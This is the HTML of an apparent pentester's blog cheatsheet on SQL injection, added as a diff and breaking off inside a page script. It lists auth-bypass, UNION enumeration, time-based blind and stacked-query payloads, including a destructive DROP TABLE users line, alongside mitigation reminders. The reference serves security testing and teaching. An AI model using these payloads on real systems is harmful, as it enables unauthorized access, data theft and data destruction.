@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>SQL Injection Cheatsheet | realspaceeagle</title>
+<meta name="keywords" content="sql-injection, web-security, cheatsheet">
+<meta name="description" content="Payload patterns, testing workflow, and remediation guidance for SQL injection vulnerabilities.">
+<meta name="author" content="realspaceeagle">
+<link rel="canonical" href="https://realspaceeagle.github.io/cheatsheets/sql-injection/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.a482bf00fa5c046040ef7973ad5fdf5657890cacb596c93f1382f664ca542074.css" integrity="sha256-pIK/APpcBGBA73lzrV/fVleJDKy1lsk/E4L2ZMpUIHQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="icon" type="image/png" sizes="16x16" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="icon" type="image/png" sizes="32x32" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="apple-touch-icon" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="mask-icon" href="https://realspaceeagle.github.io/favicon.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://realspaceeagle.github.io/cheatsheets/sql-injection/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+
+<meta name="description" content="Payload patterns, testing workflow, and remediation guidance for SQL injection vulnerabilities.">
+<meta name="keywords" content="sql-injection, web-security, cheatsheet">
+<meta name="author" content="realspaceeagle">
+<meta name="robots" content="index, follow">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+<link rel="canonical" href="https://realspaceeagle.github.io/cheatsheets/sql-injection/">
+
+
+<meta property="og:title" content="SQL Injection Cheatsheet - realspaceeagle">
+<meta property="og:description" content="Payload patterns, testing workflow, and remediation guidance for SQL injection vulnerabilities.">
+<meta property="og:url" content="https://realspaceeagle.github.io/cheatsheets/sql-injection/">
+<meta property="og:site_name" content="realspaceeagle">
+<meta property="og:locale" content="en_US"><meta property="og:type" content="article">
+<meta property="article:author" content="realspaceeagle"><meta property="article:published_time" content="2024-01-01T00:00:00Z"><meta property="article:modified_time" content="2024-01-01T00:00:00Z"><meta property="article:tag" content="sql-injection"><meta property="article:tag" content="web-security"><meta property="article:tag" content="cheatsheet"><meta property="article:section" content="cheatsheets"><meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+  <meta property="og:image:alt" content="realspaceeagle">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@haran_loga">
+<meta name="twitter:creator" content="@haran_loga">
+<meta name="twitter:title" content="SQL Injection Cheatsheet - realspaceeagle">
+<meta name="twitter:description" content="Payload patterns, testing workflow, and remediation guidance for SQL injection vulnerabilities."><meta name="twitter:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+  <meta name="twitter:image:alt" content="realspaceeagle"><meta name="article:author" content="realspaceeagle">
+<meta name="article:publisher" content="https://realspaceeagle.github.io/"><meta name="news_keywords" content="sql-injection, web-security, cheatsheet">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org","@type": "BlogPosting",
+  "headline": "SQL Injection Cheatsheet",
+  "description": "Payload patterns, testing workflow, and remediation guidance for SQL injection vulnerabilities.",
+  "author": {
+    "@type": "Person",
+    "name": "realspaceeagle",
+    "jobTitle": "Cybersecurity Professional \u0026 Penetration Tester",
+    "description": "Cybersecurity enthusiast specializing in penetration testing, network security, and offensive security. Sharing knowledge through practical tutorials, tool reviews, and real-world scenarios. Passionate about helping others learn cybersecurity through hands-on experience.",
+    "url": "https:\/\/realspaceeagle.github.io\/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "realspaceeagle",
+    "jobTitle": "Cybersecurity Professional \u0026 Penetration Tester",
+    "url": "https:\/\/realspaceeagle.github.io\/"
+  },
+  "datePublished": "2024-01-01T00:00:00Z","dateModified": "2024-01-01T00:00:00Z","url": "https:\/\/realspaceeagle.github.io\/cheatsheets\/sql-injection\/",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https:\/\/realspaceeagle.github.io\/cheatsheets\/sql-injection\/"
+  },"image": {
+    "@type": "ImageObject",
+    "url": "https:\/\/realspaceeagle.github.io\/images\/og-image.svg",
+    "width": 1200,
+    "height": 630
+  },"keywords": "sql-injection, web-security, cheatsheet",
+  "articleSection": "cheatsheets",
+  "wordCount":  290 ,
+  "genre": ["Cybersecurity", "Technology", "Education"],
+  "about": [{
+      "@type": "Thing",
+      "name": "sql-injection"
+    },{
+      "@type": "Thing",
+      "name": "web-security"
+    },{
+      "@type": "Thing",
+      "name": "cheatsheet"
+    }]}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position": 1,
+      "name": "Home",
+      "item": "https:\/\/realspaceeagle.github.io\/"
+    },{
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Cheatsheets",
+      "item": "https:\/\/realspaceeagle.github.io\/categories\/cheatsheets\/"
+    },{
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "SQL Injection Cheatsheet",
+      "item": "https:\/\/realspaceeagle.github.io\/cheatsheets\/sql-injection\/"
+    }]
+}
+</script>
+
+
+<link rel="stylesheet" href="/css/terminal-style.css">
+
+
+<link rel="stylesheet" href="/css/scroll-enhancement.css">
+
+
+<link rel="stylesheet" href="/css/mobile-navigation.css">
+
+
+<link rel="stylesheet" href="/css/mobile-responsive-pages.css">
+
+
+<link rel="stylesheet" href="/css/header-width-fix.css">
+
+
+<link rel="stylesheet" href="/css/share-buttons.css">
+
+
+<link rel="stylesheet" href="/css/comments.css">
+
+
+<link rel="stylesheet" href="/css/blog-enhancements.css">
+
+
+<link rel="stylesheet" href="/css/blog-sidebar.css">
+
+
+<link rel="stylesheet" href="/css/project-toggle.css">
+
+
+<link rel="stylesheet" href="/css/code-copy-enhancements.css">
+
+
+<link rel="stylesheet" href="/css/ctf-writeup.css">
+
+
+<link rel="stylesheet" href="/css/github-stats.css">
+
+
+<link rel="stylesheet" href="https://unpkg.com/github-calendar@2.3.4/dist/github-calendar-responsive.css" onerror="this.remove();" />
+<script src="https://unpkg.com/github-calendar@2.3.4/dist/github-calendar.min.js" onerror="this.remove();"></script>
+
+
+<script src="/js/github-calendar-enhanced.js" defer></script>
+
+
+<script src="/js/github-contribution-tracker.js" defer></script>
+
+
+<script src="/js/github-api-fallback.js" defer></script>
+
+
+<script src="/js/github-integration.js" defer></script>
+
+
+<script src="/js/twitter-timeline.js" defer></script>
+<script src="/js/twitter-manual.js" defer></script>
+
+
+<script src="/js/code-copy-enhanced.js" defer></script>
+
+
+
+
+<script src="/js/enhanced-search.js" defer></script>
+
+
+
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-GPTRZ14YZS"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-GPTRZ14YZS');
+        }
+      </script><meta property="og:url" content="https://realspaceeagle.github.io/cheatsheets/sql-injection/">
+  <meta property="og:site_name" content="realspaceeagle">
+  <meta property="og:title" content="SQL Injection Cheatsheet">
+  <meta property="og:description" content="Payload patterns, testing workflow, and remediation guidance for SQL injection vulnerabilities.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="cheatsheets">
+    <meta property="article:published_time" content="2024-01-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-01-01T00:00:00+00:00">
+    <meta property="article:tag" content="Sql-Injection">
+    <meta property="article:tag" content="Web-Security">
+    <meta property="article:tag" content="Cheatsheet">
+      <meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+<meta name="twitter:title" content="SQL Injection Cheatsheet">
+<meta name="twitter:description" content="Payload patterns, testing workflow, and remediation guidance for SQL injection vulnerabilities.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Security Cheatsheets",
+      "item": "https://realspaceeagle.github.io/cheatsheets/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "SQL Injection Cheatsheet",
+      "item": "https://realspaceeagle.github.io/cheatsheets/sql-injection/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SQL Injection Cheatsheet",
+  "name": "SQL Injection Cheatsheet",
+  "description": "Payload patterns, testing workflow, and remediation guidance for SQL injection vulnerabilities.",
+  "keywords": [
+    "sql-injection", "web-security", "cheatsheet"
+  ],
+  "articleBody": "SQL Injection Cheatsheet Test Workflow Identify entry points: parameters, headers, cookies, JSON bodies. Baseline request: repeat the request and capture the normal response for comparison. Break the query: start with a single quote ' or double quote \" to look for syntax errors. Confirm injection: use logic tests such as AND 1=1 (true) vs AND 1=2 (false). Escalate: move from time-based to union-based or stacked queries depending on DBMS. Quick Payloads ' OR '1'='1' -- \" OR \"1\"=\"1\" -- ') OR '1'='1' -- admin' -- admin' # Numeric Context 1 OR 1=1 1 UNION ALL SELECT NULL 1 ORDER BY 5-- Boolean Tests 1 AND 1=1 1 AND SLEEP(5) 1 AND (SELECT 1 FROM pg_sleep(5)) Union Enumeration Count columns: ORDER BY 1, ORDER BY 2, increment until error. Match types: UNION ALL SELECT NULL,NULL etc. Extract data: replace NULL with payloads like @@version, database(), or current_user. 1 UNION ALL SELECT @@version, user() 1 UNION ALL SELECT NULL, table_name FROM information_schema.tables Time-Based Enumeration 1 AND SLEEP(5) 1 AND (SELECT CASE WHEN (SUBSTRING(user(),1,1)='r') THEN SLEEP(5) ELSE 0 END) '; WAITFOR DELAY '0:0:5'-- Stacked Queries '; DROP TABLE users; -- '; INSERT INTO log_table(user, ts) VALUES ('tester', NOW()); -- Only available when the database driver supports multiple statements.\nDetection Cheatcodes Check Content-Length differences between responses. For blind cases, use time or response length changes. Monitor HTTP status codes (500 vs 200) during tests. DBMS Fingerprints Indicator Likely DBMS @@version, sysobjects SQL Server information_schema.tables MySQL/PostgreSQL DUAL, FROM dual Oracle sqlite_master SQLite Mitigation Reminders Parameterized queries or stored procedures only. Input validation and allow lists (do not rely on blacklist). Use least privilege DB accounts. Centralize error handling to avoid leaking stack traces. Always capture before/after evidence and coordinate fixes with developers and database administrators.\n",
+  "wordCount" : "290",
+  "inLanguage": "en",
+  "image": "https://realspaceeagle.github.io/images/og-image.svg","datePublished": "2024-01-01T00:00:00Z",
+  "dateModified": "2024-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": {"avatar":"/images/avatar.svg","bio":"Cybersecurity enthusiast specializing in penetration testing, network security, and offensive security. Sharing knowledge through practical tutorials, tool reviews, and real-world scenarios. Passionate about helping others learn cybersecurity through hands-on experience.","name":"realspaceeagle","title":"Cybersecurity Professional \u0026 Penetration Tester"}
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://realspaceeagle.github.io/cheatsheets/sql-injection/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "realspaceeagle",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://realspaceeagle.github.io/favicon.svg"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://realspaceeagle.github.io/" accesskey="h" title="realspaceeagle (Alt + H)">realspaceeagle</a>
+            
+            
+            <button class="mobile-menu-toggle" id="mobile-menu-toggle" aria-label="Toggle mobile menu">
+                <span class="hamburger-line"></span>
+                <span class="hamburger-line"></span>
+                <span class="hamburger-line"></span>
+            </button>
+            
+            <div class="logo-switches">
+                
+                <div class="social-icons">
+                    <a href="https://www.linkedin.com/in/dream4ip/" target="_blank" rel="noopener noreferrer" 
+                       title="Connect on LinkedIn" aria-label="LinkedIn Profile" class="social-link">
+                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
+                        </svg>
+                    </a>
+                    <a href="https://twitter.com/haran_loga" target="_blank" rel="noopener noreferrer" 
+                       title="Follow on X/Twitter" aria-label="Twitter Profile" class="social-link">
+                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+                        </svg>
+                    </a>
+                    <a href="https://github.com/realspaceeagle" target="_blank" rel="noopener noreferrer" 
+                       title="View Code on GitHub" aria-label="GitHub Profile" class="social-link">
+                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+                        </svg>
+                    </a>
+                </div>
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        
+        <ul id="menu" class="desktop-menu">
+            <li>
+                <a href="https://realspaceeagle.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/archives/" title="Archives">
+                    <span>Archives</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/cheatsheets/" title="Cheatsheets">
+                    <span>Cheatsheets</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/contact/" title="Contact">
+                    <span>Contact</span>
+                </a>
+            </li>
+        </ul>
+        
+        
+        <div id="mobile-menu" class="mobile-menu">
+            <ul class="mobile-menu-list">
+                <li>
+                    <a href="https://realspaceeagle.github.io/" title="Home">
+                        <span>Home</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/about/" title="About">
+                        <span>About</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/archives/" title="Archives">
+                        <span>Archives</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/cheatsheets/" title="Cheatsheets">
+                        <span>Cheatsheets</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/search/" title="Search" accesskey=/>
+                        <span>Search</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/tags/" title="Tags">
+                        <span>Tags</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/categories/" title="Categories">
+                        <span>Categories</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/projects/" title="Projects">
+                        <span>Projects</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/contact/" title="Contact">
+                        <span>Contact</span>
+                    </a>
+                </li>
+            </ul>
+        </div>
+    </nav>
+</header>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const mobileMenuToggle = document.getElementById('mobile-menu-toggle');
+    const mobileMenu = document.getElementById('mobile-menu');
+    const body = document.body;
+    
+    if (mobileMenuToggle && mobileMenu) {
+        mobileMenuToggle.addEventListener('click', function() {
+            const isOpen = mobileMenu.classList.contains('active');
+            
+            if (isOpen) {
+                mobileMenu.classList.remove('active');
+                mobileMenuToggle.classList.remove('active');
+                body.classList.remove('mobile-menu-open');
+            } else {
+                mobileMenu.classList.add('active');
+                mobileMenuToggle.classList.add('active');
+                body.classList.add('mobile-menu-open');
+            }
+        });
+        
+        
+        const mobileMenuLinks = mobileMenu.querySelectorAll('a');
+        mobileMenuLinks.forEach(link => {
+            link.addEventListener('click', function() {
+                mobileMenu.classList.remove('active');
+                mobileMenuToggle.classList.remove('active');
+                body.classList.remove('mobile-menu-open');
+            });
+        });
+        
+        
+        document.addEventListener('click', function(event) {
+            if (!mobileMenu.contains(event.target) && !mobileMenuToggle.contains(event.target)) {
+                mobileMenu.classList.remove('active');
+                mobileMenuToggle.classList.remove('active');
+                body.classList.remove('mobile-menu-open');
+            }
+        });
+    }
+});
+</script><main class="main">
+<link rel="stylesheet" href="/css/cheatsheet-style.css">
+
+<article class="post-single cheatsheet-page">
+  <header class="post-header">
+    <div class="breadcrumbs">
+      <a href="/">Home</a> &nbsp;/&nbsp; <a href="/cheatsheets/">Cheatsheets</a> &nbsp;/&nbsp; SQL Injection Cheatsheet
+    </div>
+    <h1 class="post-title">
+      SQL Injection Cheatsheet
+    </h1>
+    <div class="post-description">
+      Payload patterns, testing workflow, and remediation guidance for SQL injection vulnerabilities.
+    </div>
+    <div class="post-meta">
+      <span title='January 1, 2024'>
+        January 1, 2024
+      </span>
+      <span class="post-tags">
+        <a href="/tags/sql-injection">#sql-injection</a>
+        <a href="/tags/web-security">#web-security</a>
+        <a href="/tags/cheatsheet">#cheatsheet</a>
+      </span>
+    </div>
+  </header>
+
+  <div class="post-content"><h1 id="sql-injection-cheatsheet">SQL Injection Cheatsheet</h1>
+<h2 id="test-workflow">Test Workflow</h2>
+<ol>
+<li><strong>Identify entry points</strong>: parameters, headers, cookies, JSON bodies.</li>
+<li><strong>Baseline request</strong>: repeat the request and capture the normal response for comparison.</li>
+<li><strong>Break the query</strong>: start with a single quote <code>'</code> or double quote <code>&quot;</code> to look for syntax errors.</li>
+<li><strong>Confirm injection</strong>: use logic tests such as <code>AND 1=1</code> (true) vs <code>AND 1=2</code> (false).</li>
+<li><strong>Escalate</strong>: move from time-based to union-based or stacked queries depending on DBMS.</li>
+</ol>
+<h2 id="quick-payloads">Quick Payloads</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">&#39; OR &#39;1&#39;=&#39;1&#39; -- 
+</span></span></span><span class="line"><span class="cl"><span class="err">&#34; OR &#34;1&#34;=&#34;1&#34; -- 
+</span></span></span><span class="line"><span class="cl"><span class="err">&#39;) OR &#39;1&#39;=&#39;1&#39; -- 
+</span></span></span><span class="line"><span class="cl"><span class="err">admin&#39; -- 
+</span></span></span><span class="line"><span class="cl"><span class="err">admin&#39; #
+</span></span></span></code></pre></div><h3 id="numeric-context">Numeric Context</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">1 OR 1=1
+</span></span></span><span class="line"><span class="cl"><span class="err">1 UNION ALL SELECT NULL
+</span></span></span><span class="line"><span class="cl"><span class="err">1 ORDER BY 5--
+</span></span></span></code></pre></div><h3 id="boolean-tests">Boolean Tests</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">1 AND 1=1
+</span></span></span><span class="line"><span class="cl"><span class="err">1 AND SLEEP(5)
+</span></span></span><span class="line"><span class="cl"><span class="err">1 AND (SELECT 1 FROM pg_sleep(5))
+</span></span></span></code></pre></div><h2 id="union-enumeration">Union Enumeration</h2>
+<ol>
+<li><strong>Count columns</strong>: <code>ORDER BY 1</code>, <code>ORDER BY 2</code>, increment until error.</li>
+<li><strong>Match types</strong>: <code>UNION ALL SELECT NULL,NULL</code> etc.</li>
+<li><strong>Extract data</strong>: replace <code>NULL</code> with payloads like <code>@@version</code>, <code>database()</code>, or <code>current_user</code>.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">1 UNION ALL SELECT @@version, user()
+</span></span></span><span class="line"><span class="cl"><span class="err">1 UNION ALL SELECT NULL, table_name FROM information_schema.tables
+</span></span></span></code></pre></div><h2 id="time-based-enumeration">Time-Based Enumeration</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">1 AND SLEEP(5)
+</span></span></span><span class="line"><span class="cl"><span class="err">1 AND (SELECT CASE WHEN (SUBSTRING(user(),1,1)=&#39;r&#39;) THEN SLEEP(5) ELSE 0 END)
+</span></span></span><span class="line"><span class="cl"><span class="err">&#39;; WAITFOR DELAY &#39;0:0:5&#39;--
+</span></span></span></code></pre></div><h2 id="stacked-queries">Stacked Queries</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">&#39;; DROP TABLE users; --
+</span></span></span><span class="line"><span class="cl"><span class="err">&#39;; INSERT INTO log_table(user, ts) VALUES (&#39;tester&#39;, NOW()); --
+</span></span></span></code></pre></div><blockquote>
+<p>Only available when the database driver supports multiple statements.</p></blockquote>
+<h2 id="detection-cheatcodes">Detection Cheatcodes</h2>
+<ul>
+<li>Check <code>Content-Length</code> differences between responses.</li>
+<li>For blind cases, use time or response length changes.</li>
+<li>Monitor HTTP status codes (500 vs 200) during tests.</li>
+</ul>
+<h2 id="dbms-fingerprints">DBMS Fingerprints</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Indicator</th>
+          <th>Likely DBMS</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>@@version</code>, <code>sysobjects</code></td>
+          <td>SQL Server</td>
+      </tr>
+      <tr>
+          <td><code>information_schema.tables</code></td>
+          <td>MySQL/PostgreSQL</td>
+      </tr>
+      <tr>
+          <td><code>DUAL</code>, <code>FROM dual</code></td>
+          <td>Oracle</td>
+      </tr>
+      <tr>
+          <td><code>sqlite_master</code></td>
+          <td>SQLite</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="mitigation-reminders">Mitigation Reminders</h2>
+<ul>
+<li>Parameterized queries or stored procedures only.</li>
+<li>Input validation and allow lists (do not rely on blacklist).</li>
+<li>Use least privilege DB accounts.</li>
+<li>Centralize error handling to avoid leaking stack traces.</li>
+</ul>
+<hr>
+<p><em>Always capture before/after evidence and coordinate fixes with developers and database administrators.</em></p>
+
+  </div>
+
+  <footer class="post-footer">
+    <nav class="paginav">
+      Tags:
+      <a class="tag" href="https://realspaceeagle.github.io/tags/sql-injection/"># Sql-Injection</a>
+      <a class="tag" href="https://realspaceeagle.github.io/tags/web-security/"># Web-Security</a>
+      <a class="tag" href="https://realspaceeagle.github.io/tags/cheatsheet/"># Cheatsheet</a>
+    </nav>
+  </footer>
+</article>
+
+<style>
+.breadcrumbs {
+  font-size: 0.875rem;
+  color: var(--secondary);
+  margin-bottom: 1rem;
+}
+
+.breadcrumbs a {
+  color: var(--primary);
+  text-decoration: none;
+}
+
+.breadcrumbs a:hover {
+  text-decoration: underline;
+}
+
+.post-description {
+  font-size: 1.125rem;
+  color: var(--secondary);
+  margin: 1rem 0 2rem 0;
+  font-style: italic;
+}
+
+.post-tags a {
+  display: inline-block;
+  background: var(--code-bg);
+  color: var(--primary);
+  padding: 0.25rem 0.75rem;
+  border-radius: 1rem;
+  text-decoration: none;
+  font-size: 0.875rem;
+  margin: 0 0.5rem 0.5rem 0;
+  transition: all 0.2s ease;
+}
+
+.post-tags a:hover {
+  background: var(--primary);
+  color: var(--theme);
+  transform: translateY(-1px);
+}
+
+.tag {
+  display: inline-block;
+  background: var(--tertiary);
+  color: var(--primary);
+  padding: 0.25rem 0.75rem;
+  border-radius: 1rem;
+  text-decoration: none;
+  font-size: 0.875rem;
+  margin: 0 0.5rem 0.5rem 0;
+  transition: all 0.2s ease;
+}
+
+.tag:hover {
+  background: var(--primary);
+  color: var(--theme);
+  transform: translateY(-1px);
+}
+
+ 
+.cheatsheet-page pre {
+  position: relative;
+  font-size: 0.9rem;
+}
+
+.cheatsheet-page pre code {
+  display: block;
+  padding: 0;
+  margin-left: 2rem;
+}
+
+ 
+.cheatsheet-page pre::after {
+  content: "Copy";
+  position: absolute;
+  top: 0.5rem;
+  right: 0.5rem;
+  background: rgba(255, 255, 255, 0.1);
+  color: #fff;
+  padding: 0.25rem 0.5rem;
+  border-radius: 4px;
+  font-size: 0.75rem;
+  cursor: pointer;
+  opacity: 0;
+  transition: opacity 0.2s ease;
+}
+
+.cheatsheet-page pre:hover::after {
+  opacity: 1;
+}
+
+ 
+.cheatsheet-page ul li a {
+  color: var(--primary);
+  text-decoration: none;
+  padding: 0.25rem 0;
+  display: block;
+  transition: color 0.2s ease;
+}
+
+.cheatsheet-page ul li a:hover {
+  color: var(--tertiary);
+  padding-left: 0.5rem;
+}
+</style>
+
+<script>
+
+document.addEventListener('DOMContentLoaded', function() {
+  const codeBlocks = document.querySelectorAll('.cheatsheet-page pre');
+  
+  codeBlocks.forEach(block => {
+    block.addEventListener('click', function(e) {
+      if (e.target === this || e.target.tagName === 'CODE') {
+        const code = this.querySelector('code');
+        if (code) {
+          navigator.clipboard.writeText(code.textContent).then(() => {
+            const button = this.querySelector('::after') || this;
+            const originalContent = button.textContent;
+            
+            
+            this.style.borderLeftColor = '#10b981';
+            setTimeout(() => {
+              this.style.borderLeftColor = '#2563eb';
+            }, 300);
